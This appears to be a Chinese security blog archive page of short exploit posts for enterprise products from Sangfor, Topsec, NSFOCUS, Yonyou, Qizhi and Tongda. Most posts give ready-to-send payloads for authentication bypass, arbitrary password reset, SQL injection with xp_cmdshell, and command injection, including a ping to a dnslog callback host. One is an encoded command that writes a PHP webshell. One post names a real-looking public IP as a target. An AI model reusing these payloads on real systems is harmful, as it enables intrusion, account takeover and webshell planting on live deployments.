<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ip&#x2F;ui&#x2F;login.php?user&#x3D;需登录的用户名</span><br></pre></td></tr></table></figure>

<p>列如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;1.1.1.1:1980&#x2F;ui&#x2F;login.php?user&#x3D;admin</span><br></pre></td></tr></table></figure>

<p>查询完毕以后即可登录平台。<br><a target="_blank" rel="noopener" href="https://www.hackbug.net/usr/uploads/2020/08/3963593927.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3963593927.png" alt="QQ截图20200820123214.png"></a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/sangfor/">sangfor </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/Exploit/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/"><i class="fas fa-angle-double-right"></i>天融信数据防泄漏系统越权修改管理员密码</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:37.148Z" title="2020-12-23T08:50:37.148Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">a few seconds read (About 85 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/Exploit/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/">天融信数据防泄漏系统越权修改管理员密码</a></h1><div class="content"><p>无需登录权限,由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd</p>
<p>接口未授权访问,造成直接修改任意用户密码。:默认superman账户uid为1。</p>
<p>POST /?module=auth_user&amp;action=mod_edit_pwd </p>
<p>Cookie: username=superman;</p>
<p>uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913020248653.png" alt="image-20200913020248653"></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/%E5%A4%A9%E8%9E%8D%E4%BF%A1/">天融信 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/Exploit/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/"><i class="fas fa-angle-double-right"></i>绿盟UTS综合威胁探针管理员任意登录</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:42.919Z" title="2020-12-23T08:50:42.919Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">3 minutes read (About 461 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/Exploit/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/">绿盟UTS综合威胁探针管理员任意登录</a></h1><div class="content"><p>绿盟全流量威胁分析解决方案针对原始流量进行采集和监控，对流量信息进行深度还原、存储、查询和分析，可以及时掌握重要信息系统相关网络安全威胁风险，及时检测漏洞、病毒木马、网络攻击情况，及时发现网络安全事件线索，及时通报预警重大网络安全威胁，调查、防范和打击网络攻击等恶意行为，保障重要信息系统的网络安全。<br>绿盟综合威胁探针设备版本V2.0R00F02SP02及之前存在此漏洞。<br>处置意见:<br>建议尽快更新补丁至最新： <a target="_blank" rel="noopener" href="http://update.nsfocus.com/update/listBsaUtsDetail/v/F02">http://update.nsfocus.com/update/listBsaUtsDetail/v/F02</a></p>
<hr>
<p>漏洞利用过程：<br><a target="_blank" rel="noopener" href="https://www.hackbug.net/usr/uploads/2020/09/1229899313.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1229899313.png" alt="1.png"></a><br><a target="_blank" rel="noopener" href="https://www.hackbug.net/usr/uploads/2020/09/2582773457.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/2582773457.png" alt="2.png"></a><br>对响应包进行修改，将false更改为true的时候可以泄露管理用户的md5值密码<br><a target="_blank" rel="noopener" href="https://www.hackbug.net/usr/uploads/2020/09/3504865237.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3504865237.png" alt="3.png"></a><br><a target="_blank" rel="noopener" href="https://www.hackbug.net/usr/uploads/2020/09/3291977248.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3291977248.png" alt="4.png"></a><br><a target="_blank" rel="noopener" href="https://www.hackbug.net/usr/uploads/2020/09/1281439051.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1281439051.png" alt="5.png"></a><br>利用渠道的md5值去登录页面<br><a target="_blank" rel="noopener" href="https://www.hackbug.net/usr/uploads/2020/09/3782919846.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3782919846.png" alt="6.png"></a><br>7ac301836522b54afcbbed714534c7fb<br><a target="_blank" rel="noopener" href="https://www.hackbug.net/usr/uploads/2020/09/370804192.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/370804192.png" alt="6.png"></a><br><a target="_blank" rel="noopener" href="https://www.hackbug.net/usr/uploads/2020/09/78344586.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/78344586.png" alt="8.png"></a><br>成功登录，登录后通过管理员权限对设备进行管控，并且可以看到大量的攻击信息，泄露内部网络地址包括资产管理。</p>
<h2 id="本文链接："><a href="#本文链接：" class="headerlink" title="本文链接："></a>本文链接：</h2><p><a target="_blank" rel="noopener" href="https://www.hackbug.net/archives/112.html">https://www.hackbug.net/archives/112.html</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/%E7%BB%BF%E7%9B%9F/">绿盟 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/Exploit/%E7%94%A8%E5%8F%8BGRP-u8-%E6%B3%A8%E5%85%A5/"><i class="fas fa-angle-double-right"></i>用友GRP-u8 注入</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:32.096Z" title="2020-12-23T08:50:32.096Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">a few seconds read (About 46 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/Exploit/%E7%94%A8%E5%8F%8BGRP-u8-%E6%B3%A8%E5%85%A5/">用友GRP-u8 注入</a></h1><div class="content"><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914141058235.png" alt="image-20200914141058235"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;Proxy HTTP&#x2F;1.1Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0;)Host: localhostContent-Length: 341Connection: Keep-AliveCache-Control: no-cache</span><br><span class="line">cVer&#x3D;9.8.0&amp;dp&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;GB2312&quot;?&gt;&lt;R9PACKET version&#x3D;&quot;1&quot;&gt;&lt;DATAFORMAT&gt;XML&lt;&#x2F;DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;&#x2F;NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;&#x2F;NAME&gt;&lt;DATA format&#x3D;&quot;text&quot;&gt;DataSetProviderData&lt;&#x2F;DATA&gt;&lt;&#x2F;PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;&#x2F;NAME&gt;&lt;DATA format&#x3D;&quot;text&quot;&gt;exec xp_cmdshell &#39;whoami&#39;&lt;&#x2F;DATA&gt;&lt;&#x2F;PARAM&gt;&lt;&#x2F;PARAMS&gt;&lt;&#x2F;R9FUNCTION&gt;&lt;&#x2F;R9PACKET&gt;</span><br></pre></td></tr></table></figure>

</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/%E7%94%A8%E5%8F%8B/">用友 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/Exploit/%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9FSql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"><i class="fas fa-angle-double-right"></i>天融信TopApp-LB 负载均衡系统Sql注入漏洞</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:34.513Z" title="2020-12-23T08:50:34.513Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">2 minutes read (About 308 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/Exploit/%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9FSql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">天融信TopApp-LB 负载均衡系统Sql注入漏洞</a></h1><div class="content"><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913015312879.png" alt="image-20200913015312879"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;acc&#x2F;clsf&#x2F;report&#x2F;datasource.php HTTP&#x2F;1.1Host: localhostConnection: closeAccept: text&#x2F;javascript, text&#x2F;html, application&#x2F;xml, text&#x2F;xml, *&#x2F;*User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.105 Safari&#x2F;537.36Accept-Language: zh-CN,zh;q&#x3D;0.9Content-Type: application&#x2F;x-www-form-urlencoded t&#x3D;l&amp;e&#x3D;0&amp;s&#x3D;t&amp;l&#x3D;1&amp;vid&#x3D;1+union select 1,2,3,4,5,6,7,8,9,substr(&#39;a&#39;,1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid&#x3D;0&amp;lmt&#x3D;10&amp;o&#x3D;r_Speed&amp;asc&#x3D;false&amp;p&#x3D;8&amp;lipf&#x3D;&amp;lipt&#x3D;&amp;ripf&#x3D;&amp;ript&#x3D;&amp;dscp&#x3D;&amp;proto&#x3D;&amp;lpf&#x3D;&amp;lpt&#x3D;&amp;rpf&#x3D;&amp;rpt&#x3D;@。。</span><br></pre></td></tr></table></figure>

<p>网友称以下两个历史漏洞仍然可以复现。</p>
<p><a target="_blank" rel="noopener" href="https://www.uedbox.com/post/21626/">https://www.uedbox.com/post/21626/</a></p>
<h3 id="简要描述："><a href="#简要描述：" class="headerlink" title="简要描述："></a>简要描述：</h3><p>天融信负载均衡TopApp-LB系统无需密码直接登陆</p>
<h3 id="详细说明："><a href="#详细说明：" class="headerlink" title="详细说明："></a>详细说明：</h3><p><strong>.</strong>.<strong>.</strong>/<strong>.</strong>.<strong>.</strong>/<strong>.</strong>.<strong>.</strong>/https://<strong>.</strong>.<strong>.</strong>/</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名随意  密码：;id</span><br></pre></td></tr></table></figure>



<h3 id="漏洞证明："><a href="#漏洞证明：" class="headerlink" title="漏洞证明："></a>漏洞证明：</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/d3594a983f25bd0d139b27c02cd688eb6f1ca99d.jpg" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/019af9239f1dfbc6124a5b19055d95a1ca1d39fc.jpg" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/facb5a13142ce22ea2d4dfcf9c29b3cf6a95412f.jpg" alt="img"></p>
<p><a target="_blank" rel="noopener" href="https://www.uedbox.com/post/22193/">https://www.uedbox.com/post/22193/</a></p>
<p>TopApp-LB负载均衡（绝对是随机找的）<a target="_blank" rel="noopener" href="https://101.231.40.234/执行命令">https://101.231.40.234/执行命令</a></p>
<p>执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; ping 9928e5.dnslog.info; echo</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/89b6282962ccb026c6ba981c9ce0ad0ad1215ae7.jpg" alt="img"></p>
<p>命令被成功执行，效果如图。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/b3dd327a068f4cf46d2d8987356bab0427bbb732.jpg" alt="img"></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入, </a><a class="link-muted" rel="tag" href="/tags/%E5%A4%A9%E8%9E%8D%E4%BF%A1/">天融信 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/Exploit/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2019-20835%EF%BC%89/"><i class="fas fa-angle-double-right"></i>齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:39.427Z" title="2020-12-23T08:50:39.427Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">a minute read (About 169 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/Exploit/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2019-20835%EF%BC%89/">齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）</a></h1><div class="content"><p>齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）</p>
<p>未授权无需登录。</p>
<p>1、访问 <a target="_blank" rel="noopener" href="http://10.20.10.11/listener/cluster_manage.php">http://10.20.10.11/listener/cluster_manage.php</a>  :返回 “OK”.</p>
<p>2、访问如下链接即可getshell，执行成功后，生成PHP一句话马</p>
<p>3、/var/www/shterm/resources/qrcode/lbj77.php 密码10086</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;10.20.10.10&#x2F;ha_request.php?action&#x3D;install&amp;ipaddr&#x3D;10.20.10.11&amp;node_id&#x3D;1$&#123;IFS&#125;|&#96;echo$&#123;IFS&#125;&quot; ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK&quot;|base64$&#123;IFS&#125;- d|bash&#96;|$&#123;IFS&#125;|echo$&#123;IFS&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913015044393.png" alt="image-20200913015044393"></p>
<p>这里假设10.20.10.10为堡垒机的IP地址。</p>
<p>另外一个版本是java的。</p>
<p>POST /shterm/listener/tui_update.php</p>
<p>a=[“t’;import os;os.popen(‘whoami’)#”]</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915094059411.png" alt="image-20200915094059411"></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/">齐治堡垒机 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA11-6-preAuth-RCE%E5%88%86%E6%9E%90/"><i class="fas fa-angle-double-right"></i>通达OA11.6 preAuth RCE分析</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:51:13.778Z" title="2020-12-23T08:51:13.778Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">an hour read (About 9068 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA11-6-preAuth-RCE%E5%88%86%E6%9E%90/">通达OA11.6 preAuth RCE分析</a></h1><div class="content"><p>该漏洞需要结合任意文件删除以及文件上传漏洞进行配合</p>
<h1 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h1><p>首先漏洞是在/module/appbuilder/assets/print.php</p>
<h3 id="img"><a href="#img" class="headerlink" title="img"></a><a href="data:image/png;base64,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